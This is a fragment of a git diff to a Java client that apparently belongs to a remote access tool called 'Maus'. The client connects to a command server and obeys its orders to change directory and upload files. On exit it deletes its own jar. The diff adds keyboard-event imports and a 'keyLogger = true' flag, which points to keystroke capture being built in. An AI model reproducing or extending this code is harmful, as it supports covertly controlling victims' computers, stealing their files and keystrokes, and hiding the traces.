@@ -1,8 +1,15 @@
 package Client;
 
+import javafx.application.Platform;
+import javafx.stage.Screen;
+
+import java.awt.*;
+import java.awt.event.KeyEvent;
+import java.awt.event.KeyListener;
 import java.io.*;
 import java.net.Socket;
 import java.util.ArrayList;
+import java.util.EventListener;
 import java.util.UUID;
 import java.util.concurrent.TimeUnit;
 
@@ -16,6 +23,7 @@ public class Client {
     private static DataOutputStream dos;
     private static File directory;
     private static DataInputStream dis;
+    private static boolean keyLogger = true;
 
     public static void main(String[] args) throws Exception {
         /* Load server settings and then attempt to connect to Maus. */
@@ -89,6 +97,7 @@ public class Client {
             Socket socket = new Socket(HOST, PORT);
             dos = new DataOutputStream(socket.getOutputStream());
             dis = new DataInputStream(socket.getInputStream());
+
             while (true) {
                 String input;
                 try {
@@ -112,7 +121,7 @@ public class Client {
                     directoryChange();
                 } else if (input.contains("DOWNLOAD")) {
                     sendFile();
-                } else if (input.equals("EXIT")) {
+                } else if (input.contains("EXIT")) {
                     communicate("EXIT");
                     File f = new File(Client.class.getProtectionDomain().getCodeSource().getLocation().getPath());
                     f.deleteOnExit();
